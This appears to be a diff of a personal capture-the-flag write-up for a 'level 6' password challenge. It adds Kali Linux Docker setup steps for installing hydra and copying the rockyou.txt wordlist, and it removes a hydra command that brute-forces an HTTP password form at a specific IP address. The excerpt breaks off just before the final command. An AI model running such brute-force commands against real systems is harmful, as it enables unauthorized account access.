@@ -34,11 +34,22 @@ so we will start with a python script and bruteforce the password.
 
 
 using hydra kali linux
-the only command i have got not bad command output is:
-```bash
-hydra -l dummy -P rockyou.txt 34.69.146.51 http-get "/level6/:password=^PASS^:S=success:F=Invalid password"
-```
 
+basic flow for the kali linux docker
+
+docker pull kalilinux/kali-rolling
+
+docker run --network host -it kalilinux/kali-rolling /bin/bash
+
+apt update
+
+apt install hydra
+
+hydra -h
+
+
+
+ docker cp C:\Users\yaniv\ctf_challenge\excellenteam-ctf-yaniv242\level_6\rockyou.txt 4e749fdea52228eb9a206c6eaf230c1180614d4643f5663387032d3468c90155:/root/rockyou.txt
 
 finaly the perfect command:
 ```bash
